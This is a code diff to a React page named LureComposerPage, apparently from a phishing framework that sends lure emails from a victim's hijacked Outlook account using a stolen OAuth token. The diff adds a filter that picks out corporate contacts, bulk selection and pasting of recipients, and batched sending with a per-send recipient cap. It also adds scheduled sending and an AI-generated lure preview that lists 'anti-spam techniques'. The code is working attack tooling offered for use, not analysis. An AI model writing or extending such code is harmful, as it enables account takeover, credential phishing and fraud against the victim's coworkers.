@@ -67,6 +67,42 @@ const LURE_TEMPLATES = [
   },
 ];
 
+const PERSONAL_DOMAINS = new Set([
+  "gmail.com",
+  "hotmail.com",
+  "outlook.com",
+  "live.com",
+  "yahoo.com",
+  "aol.com",
+  "protonmail.com",
+  "icloud.com",
+  "me.com",
+  "mail.com",
+  "yandex.com",
+  "qq.com",
+  "163.com",
+  "foxmail.com",
+]);
+
+function isCorporateEmail(email: string | undefined): boolean {
+  if (!email) return false;
+  const domain = email.split("@")[1]?.toLowerCase();
+  if (!domain) return false;
+  return !PERSONAL_DOMAINS.has(domain);
+}
+
+function extractEmailsFromText(text: string): string[] {
+  const emails: string[] = [];
+  const parts = text.split(/[\s,;\n\r]+/);
+  for (const part of parts) {
+    const trimmed = part.trim();
+    if (trimmed.includes("@") && trimmed.includes(".")) {
+      emails.push(trimmed);
+    }
+  }
+  return [...new Set(emails)];
+}
+
 export default function LureComposerPage() {
   const params = useParams<{ tokenId: string }>();
   const tokenId = params?.tokenId;
@@ -82,6 +118,7 @@ export default function LureComposerPage() {
   const [contactSearch, setContactSearch] = useState("");
 
   const [toRecipients, setToRecipients] = useState<string[]>([]);
+  const [recipientInput, setRecipientInput] = useState("");
   const [subject, setSubject] = useState("");
   const [body, setBody] = useState("");
   const [contentType, setContentType] = useState<"HTML" | "Text">("HTML");
@@ -93,6 +130,20 @@ export default function LureComposerPage() {
   const [approvalOpen, setApprovalOpen] = useState(false);
   const [confirmText, setConfirmText] = useState("");
   const [templatePickerOpen, setTemplatePickerOpen] = useState(false);
+
+  const [showAllContacts, setShowAllContacts] = useState(false);
+  const [selectedContactEmails, setSelectedContactEmails] = useState<Set<string>>(new Set());
+  const [maxRecipientsPerSend, setMaxRecipientsPerSend] = useState(5);
+
+  const [aiPreviewOpen, setAiPreviewOpen] = useState(false);
+  const [aiPreviewData, setAiPreviewData] = useState<{
+    subject: string;
+    body: string;
+    antiSpamNotes: string[];
+    templateType: string;
+  } | null>(null);
+
+  const [scheduleTime, setScheduleTime] = useState("");
 
   const mounted = useRef(false);
 
@@ -132,7 +183,14 @@ export default function LureComposerPage() {
     }
   }, [loadToken, loadContacts]);
 
-  const filteredContacts = contacts.filter((c) => {
+  const corporateContacts = contacts.filter((c) => {
+    const email = c.emailAddresses?.[0]?.address;
+    return isCorporateEmail(email);
+  });
+
+  const visibleContacts = showAllContacts ? contacts : corporateContacts;
+
+  const filteredContacts = visibleContacts.filter((c) => {
     if (!contactSearch.trim()) return true;
     const q = contactSearch.toLowerCase();
     return (
@@ -142,13 +200,61 @@ export default function LureComposerPage() {
   });
 
   const addRecipient = (email: string) => {
-    if (!toRecipients.includes(email)) {
-      setToRecipients([...toRecipients, email]);
-    }
+    const trimmed = email.trim();
+    if (!trimmed || !trimmed.includes("@")) return;
+    setToRecipients((prev) => {
+      if (prev.includes(trimmed)) return prev;
+      return [...prev, trimmed];
+    });
+    setSelectedContactEmails((prev) => new Set(prev).add(trimmed));
   };
 
   const removeRecipient = (email: string) => {
-    setToRecipients(toRecipients.filter((e) => e !== email));
+    setToRecipients((prev) => prev.filter((e) => e !== email));
+    setSelectedContactEmails((prev) => {
+      const next = new Set(prev);
+      next.delete(email);
+      return next;
+    });
+  };
+
+  const toggleContact = (email: string | undefined) => {
+    if (!email) return;
+    if (selectedContactEmails.has(email)) {
+      removeRecipient(email);
+    } else {
+      addRecipient(email);
+    }
+  };
+
+  const selectAllVisible = () => {
+    const emails = filteredContacts
+      .map((c) => c.emailAddresses?.[0]?.address)
+      .filter((e): e is string => !!e);
+    setToRecipients((prev) => {
+      const next = new Set(prev);
+      emails.forEach((e) => next.add(e));
+      return [...next];
+    });
+    setSelectedContactEmails((prev) => {
+      const next = new Set(prev);
+      emails.forEach((e) => next.add(e));
+      return next;
+    });
+  };
+
+  const deselectAllVisible = () => {
+    const emails = new Set(
+      filteredContacts
+        .map((c) => c.emailAddresses?.[0]?.address)
+        .filter((e): e is string => !!e)
+    );
+    setToRecipients((prev) => prev.filter((e) => !emails.has(e)));
+    setSelectedContactEmails((prev) => {
+      const next = new Set(prev);
+      emails.forEach((e) => next.delete(e));
+      return next;
+    });
   };
 
   const insertOAuthLink = () => {
@@ -157,6 +263,7 @@ export default function LureComposerPage() {
   };
 
   const handleGenerateAI = async (templateType: string) => {
+    commitPendingRecipient();
     if (!token || toRecipients.length === 0) {
       toast.error("Add at least one recipient first");
       return;
@@ -173,11 +280,13 @@ export default function LureComposerPage() {
         template_type: templateType,
         context: "corporate office environment",
       });
-      setSubject(res.subject);
-      setBody(res.html_body || res.body);
-      setContentType("HTML");
-      setAntiSpamNotes(res.anti_spam_notes || []);
-      toast.success("AI lure email generated", { description: "Anti-spam techniques applied" });
+      setAiPreviewData({
+        subject: res.subject,
+        body: res.html_body || res.body,
+        antiSpamNotes: res.anti_spam_notes || [],
+        templateType,
+      });
+      setAiPreviewOpen(true);
     } catch (err: any) {
       toast.error(err.message || "Failed to generate lure email");
     } finally {
@@ -185,7 +294,53 @@ export default function LureComposerPage() {
     }
   };
 
+  const applyAIGenerated = () => {
+    if (!aiPreviewData) return;
+    setSubject(aiPreviewData.subject);
+    setBody(aiPreviewData.body);
+    setContentType("HTML");
+    setAntiSpamNotes(aiPreviewData.antiSpamNotes);
+    setAiPreviewOpen(false);
+    setAiPreviewData(null);
+    toast.success("AI lure email applied to composer", { description: "Anti-spam techniques applied" });
+  };
+
+  const regenerateAI = async () => {
+    if (!aiPreviewData || !token) return;
+    setGenerating(true);
+    try {
+      const targetEmail = toRecipients[0];
+      const targetContact = contacts.find((c) => c.emailAddresses?.some((e) => e.address === targetEmail));
+      const res = await generateLureEmail({
+        target_email: targetEmail,
+        target_name: targetContact?.displayName || undefined,
+        victim_email: token.email || "",
+        template_type: aiPreviewData.templateType,
+        context: "corporate office environment",
+      });
+      setAiPreviewData({
+        subject: res.subject,
+        body: res.html_body || res.body,
+        antiSpamNotes: res.anti_spam_notes || [],
+        templateType: aiPreviewData.templateType,
+      });
+    } catch (err: any) {
+      toast.error(err.message || "Failed to regenerate lure email");
+    } finally {
+      setGenerating(false);
+    }
+  };
+
+  const commitPendingRecipient = () => {
+    const val = recipientInput.trim();
+    if (val && val.includes("@")) {
+      addRecipient(val);
+      setRecipientInput("");
+    }
+  };
+
   const handlePreview = () => {
+    commitPendingRecipient();
     if (toRecipients.length === 0) {
       toast.error("Add at least one recipient");
       return;
@@ -215,22 +370,55 @@ export default function LureComposerPage() {
     if (!tokenId) return;
     setSending(true);
     try {
-      await sendMail(tokenId, {
-        to: toRecipients,
-        subject,
-        body,
-        content_type: contentType,
-      });
+      const max = Math.max(1, maxRecipientsPerSend);
+      for (let i = 0; i < toRecipients.length; i += max) {
+        const chunk = toRecipients.slice(i, i + max);
+        await sendMail(tokenId, {
+          to: chunk,
+          subject,
+          body,
+          content_type: contentType,
+        });
+      }
       toast.success(`Lure email sent to ${toRecipients.join(", ")}`);
       setApprovalOpen(false);
       setToRecipients([]);
       setSubject("");
       setBody("");
       setAntiSpamNotes([]);
+      setSelectedContactEmails(new Set());
+      setRecipientInput("");
+      setScheduleTime("");
     } catch (err: any) {
       toast.error(err.message || "Failed to send lure email");
     } finally {
       setSending(false);
+    }
+  };
+
+  const handleRecipientBlur = () => {
+    const val = recipientInput.trim();
+    if (val && val.includes("@")) {
+      addRecipient(val);
+      setRecipientInput("");
+    }
+  };
+
+  const handleRecipientPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+    const pasted = e.clipboardData.getData("text");
+    const emails = extractEmailsFromText(pasted);
+    if (emails.length > 0) {
+      e.preventDefault();
+      emails.forEach((email) => addRecipient(email));
+      setRecipientInput("");
+    }
+  };
+
+  const handleAddRecipientClick = () => {
+    const val = recipientInput.trim();
+    if (val && val.includes("@")) {
+      addRecipient(val);
+      setRecipientInput("");
     }
   };
 
@@ -302,6 +490,28 @@ export default function LureComposerPage() {
                   {contactsLoading && <Loader2 className="h-3.5 w-3.5 animate-spin text-muted-foreground" />}
                 </div>
                 <div className="p-3">
+                  {/* Toggle and actions */}
+                  <div className="flex items-center justify-between mb-3">
+                    <button
+                      onClick={() => setShowAllContacts((v) => !v)}
+                      className="text-[11px] text-muted-foreground hover:text-foreground transition-colors"
+                    >
+                      {showAllContacts ? "Show office only" : "Show all contacts"}
+                    </button>
+                    <div className="flex items-center gap-1.5">
+                      <Button variant="ghost" size="sm" className="h-6 text-[10px] px-2" onClick={selectAllVisible}>
+                        Select all
+                      </Button>
+                      <Button variant="ghost" size="sm" className="h-6 text-[10px] px-2" onClick={deselectAllVisible}>
+                        Deselect all
+                      </Button>
+                    </div>
+                  </div>
+                  <div className="mb-3 flex items-center gap-2">
+                    <span className="text-[11px] text-muted-foreground">
+                      {selectedContactEmails.size} contacts selected
+                    </span>
+                  </div>
                   <div className="relative mb-3">
                     <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
                     <Input
@@ -329,19 +539,32 @@ export default function LureComposerPage() {
                       <div className="space-y-1">
                         {filteredContacts.map((contact) => {
                           const email = contact.emailAddresses?.[0]?.address;
+                          const checked = !!email && selectedContactEmails.has(email);
                           return (
-                            <button
+                            <div
                               key={contact.id}
-                              onClick={() => email && addRecipient(email)}
-                              className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded-md text-xs transition-colors text-left hover:bg-secondary/50"
+                              className="w-full flex items-center gap-2 px-2.5 py-2 rounded-md text-xs transition-colors hover:bg-secondary/50"
                             >
-                              <TokenAvatar email={email || contact.displayName || "?"} size={24} />
-                              <div className="flex-1 min-w-0">
-                                <p className="font-medium text-foreground truncate">{contact.displayName || email || "Unknown"}</p>
-                                {email && <p className="text-[10px] text-muted-foreground truncate">{email}</p>}
-                              </div>
-                              <Plus className="h-3 w-3 text-muted-foreground flex-shrink-0" />
-                            </button>
+                              <input
+                                type="checkbox"
+                                checked={checked}
+                                onChange={() => toggleContact(email)}
+                                className="h-3.5 w-3.5 rounded border-white/20 bg-secondary/30 text-primary focus:ring-primary/30"
+                              />
+                              <button
+                                onClick={() => email && addRecipient(email)}
+                                className="flex items-center gap-2.5 text-left flex-1 min-w-0"
+                              >
+                                <TokenAvatar email={email || contact.displayName || "?"} size={24} />
+                                <div className="flex-1 min-w-0">
+                                  <p className="font-medium text-foreground truncate">{contact.displayName || email || "Unknown"}</p>
+                                  {email && <p className="text-[10px] text-muted-foreground truncate">{email}</p>}
+                                </div>
+                              </button>
+                              <button onClick={() => email && addRecipient(email)} className="flex-shrink-0">
+                                <Plus className="h-3 w-3 text-muted-foreground" />
+                              </button>
+                            </div>
                           );
                         })}
                       </div>
@@ -356,7 +579,7 @@ export default function LureComposerPage() {
               {/* Recipients */}
               <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                 <label className="text-xs font-medium text-muted-foreground mb-2 block">To</label>
-                <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30">
+                <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
                   {toRecipients.map((email) => (
                     <Badge
                       key={email}
@@ -370,19 +593,27 @@ export default function LureComposerPage() {
                     </Badge>
                   ))}
                   <Input
-                    placeholder="Add email..."
-                    className="flex-1 min-w-[150px] h-7 text-xs bg-transparent border-0 px-0 focus-visible:ring-0"
+                    value={recipientInput}
+                    onChange={(e) => setRecipientInput(e.target.value)}
+                    onBlur={handleRecipientBlur}
+                    onPaste={handleRecipientPaste}
                     onKeyDown={(e) => {
                       if (e.key === "Enter") {
                         e.preventDefault();
-                        const val = (e.target as HTMLInputElement).value.trim();
-                        if (val && val.includes("@")) {
-                          addRecipient(val);
-                          (e.target as HTMLInputElement).value = "";
-                        }
+                        handleAddRecipientClick();
                       }
                     }}
+                    placeholder="Add email..."
+                    className="flex-1 min-w-[150px] h-7 text-xs bg-transparent border-0 px-0 focus-visible:ring-0"
                   />
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    className="h-7 text-[11px] px-2"
+                    onClick={handleAddRecipientClick}
+                  >
+                    <Plus className="h-3 w-3 mr-1" /> Add
+                  </Button>
                 </div>
               </div>
 
@@ -423,6 +654,30 @@ export default function LureComposerPage() {
                   placeholder={contentType === "HTML" ? "Type your HTML message..." : "Type your message..."}
                   className="w-full h-64 rounded-lg border border-white/5 bg-secondary/30 px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 outline-none focus-visible:ring-1 focus-visible:ring-primary/30 resize-none font-mono"
                 />
+              </div>
+
+              {/* Schedule send + Max recipients */}
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
+                  <label className="text-xs font-medium text-muted-foreground mb-2 block">Schedule send</label>
+                  <input
+                    type="datetime-local"
+                    value={scheduleTime}
+                    onChange={(e) => setScheduleTime(e.target.value)}
+                    className="w-full h-10 rounded-lg border border-white/5 bg-secondary/30 px-3 py-2 text-xs text-foreground outline-none focus-visible:ring-1 focus-visible:ring-primary/30"
+                  />
+                </div>
+                <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
+                  <label className="text-xs font-medium text-muted-foreground mb-2 block">Max recipients per send</label>
+                  <Input
+                    type="number"
+                    min={1}
+                    max={100}
+                    value={maxRecipientsPerSend}
+                    onChange={(e) => setMaxRecipientsPerSend(Number(e.target.value))}
+                    className="h-10 bg-secondary/30 border-white/5"
+                  />
+                </div>
               </div>
 
               {/* Anti-spam notes */}
@@ -501,6 +756,62 @@ export default function LureComposerPage() {
         </DialogContent>
       </Dialog>
 
+      {/* AI Preview Dialog */}
+      <Dialog open={aiPreviewOpen} onOpenChange={setAiPreviewOpen}>
+        <DialogContent className="sm:max-w-[600px] glass-strong border-white/10">
+          <DialogHeader>
+            <DialogTitle className="text-sm font-semibold flex items-center gap-2">
+              <Sparkles className="h-4 w-4 text-primary" />
+              AI Generated Preview
+            </DialogTitle>
+            <DialogDescription className="text-xs text-muted-foreground">
+              Review the AI-generated lure before applying it to the composer.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="space-y-3 py-2">
+            <div className="flex items-center gap-2 text-xs">
+              <span className="text-muted-foreground w-14">Subject:</span>
+              <span className="text-foreground font-medium">{aiPreviewData?.subject}</span>
+            </div>
+            <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
+              <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
+              {aiPreviewData ? (
+                <div
+                  className="text-sm text-foreground prose prose-invert max-w-none prose-sm"
+                  dangerouslySetInnerHTML={{ __html: aiPreviewData.body }}
+                />
+              ) : (
+                <p className="text-sm text-muted-foreground">No preview available</p>
+              )}
+            </div>
+            {aiPreviewData && aiPreviewData.antiSpamNotes.length > 0 && (
+              <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
+                <p className="text-[11px] font-semibold text-emerald-400 uppercase mb-2">Anti-Spam Techniques</p>
+                <div className="flex flex-wrap gap-1.5">
+                  {aiPreviewData.antiSpamNotes.map((note, i) => (
+                    <Badge key={i} variant="secondary" className="text-[10px] bg-emerald-500/10 text-emerald-300 border-emerald-500/20">
+                      <CheckCircle2 className="h-2.5 w-2.5 mr-1" />
+                      {note}
+                    </Badge>
+                  ))}
+                </div>
+              </div>
+            )}
+          </div>
+          <DialogFooter className="gap-2">
+            <Button variant="outline" size="sm" onClick={() => setAiPreviewOpen(false)}>Cancel</Button>
+            <Button variant="outline" size="sm" onClick={regenerateAI} disabled={generating}>
+              {generating ? <Loader2 className="h-4 w-4 animate-spin" /> : <Wand2 className="h-4 w-4 mr-1.5" />}
+              Regenerate
+            </Button>
+            <Button size="sm" onClick={applyAIGenerated} className="gap-1.5">
+              <CheckCircle2 className="h-4 w-4" />
+              Apply to Composer
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
       {/* Preview Dialog */}
       <Dialog open={previewOpen} onOpenChange={setPreviewOpen}>
         <DialogContent className="sm:max-w-[600px] glass-strong border-white/10">
@@ -527,6 +838,12 @@ export default function LureComposerPage() {
               <span className="text-muted-foreground w-12">Subject:</span>
               <span className="text-foreground font-medium">{subject}</span>
             </div>
+            {scheduleTime && (
+              <div className="flex items-center gap-2 text-xs">
+                <span className="text-muted-foreground w-12">Schedule:</span>
+                <Badge variant="secondary" className="text-xs bg-secondary/50">{new Date(scheduleTime).toLocaleString()}</Badge>
+              </div>
+            )}
             <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
               <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
               {contentType === "HTML" ? (
@@ -569,6 +886,9 @@ export default function LureComposerPage() {
                   <p>This email will be sent from the victim's real Outlook account.</p>
                   <p>Recipients: <strong>{toRecipients.join(", ")}</strong></p>
                   <p>Subject: <strong>{subject}</strong></p>
+                  {scheduleTime && (
+                    <p>Scheduled: <strong>{new Date(scheduleTime).toLocaleString()}</strong></p>
+                  )}
                 </div>
               </div>
             </div>
